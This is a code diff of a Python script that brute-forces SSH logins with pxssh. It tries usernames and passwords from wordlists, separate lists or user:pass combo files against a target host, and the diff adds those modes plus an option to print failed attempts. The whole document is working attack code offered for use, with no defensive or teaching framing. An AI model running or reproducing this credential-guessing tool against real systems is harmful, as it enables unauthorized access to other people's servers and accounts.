@@ -10,34 +10,55 @@ class Main():
     def __init__(self):
         self.checked = 0
         self.fails = 0
-        self.op = input('Use unames as passwords: ')
-        self.verbose = input('VERBOSE: ')
+        print("1. Use a wordlist for both unames and passwords\n2. Use seperated unames list and password list:\n3. Use list Uname:Pass File (Sperated by ':')\n")
+        self.op = input(': ')
+        self.verbose = input('\n\nPrint failes: ')
 
 
-    def connect(self, host, user, password):
+    def connect(self, host, uname, password):
         self.checked += 1
         try:
             s = pxssh.pxssh()
-            s.login(host, user, password)
-            print('Password Found', user, password)
+            s.login(host, uname, password)
+            print('Password Found', uname, password)
         except pxssh.ExceptionPxssh:
             self.fails += 1
-            print(f'Password inccorect! {user}, {password}')
+            if self.verbose == 'y':
+                print(f'Password inccorect! {uname}, {password}')
 
+
+    def extract(self, path):
+        users = []
+        passwords = []
+        for line in path:
+            try:
+                user = line.split(":")[0].replace('\n', '')
+                password = line.split(":")[1].replace('\n', '')
+                users.append(user)
+                passwords.append(password)
+            except:
+                pass
+        return users, passwords
 
     def start(self):
-        if self.op == 'y':
+        if self.op == '1':
             path = input('Wordlist path: ')
-            for i in open('idk.txt', 'r'):
-                self.connect('192.168.1.105', i, i)
-            self.connect(LOCAL_IP, NAME, PASS)
+            for i in open(path, 'r'):
+                self.connect(LOCAL_IP, i, i)
 
-        elif self.op == 'n':
+        elif self.op == '2':
             path1 = input('User list path: ')
             path2 = input('Password list path: ')
             users = [user for user in open(path1, "r+", encoding='utf-8')]
             passwords = [password for password in open(path2, "r+", encoding='utf-8')]
             for i in range(0, len(users)):
-                self.connect('192.168.1.105', str(users[i]), str(passwords[i]))
+                self.connect(LOCAL_IP, str(users[i]), str(passwords[i]))
+
+        elif self.op == '3':
+            path = input('UserPass file path: ')
+            File = open(path, 'r')
+            users, passwords = self.extract(File)
+            for i in range(0, len(users)):
+                self.connect(LOCAL_IP, users[i], passwords[i])
         
 Main().start()
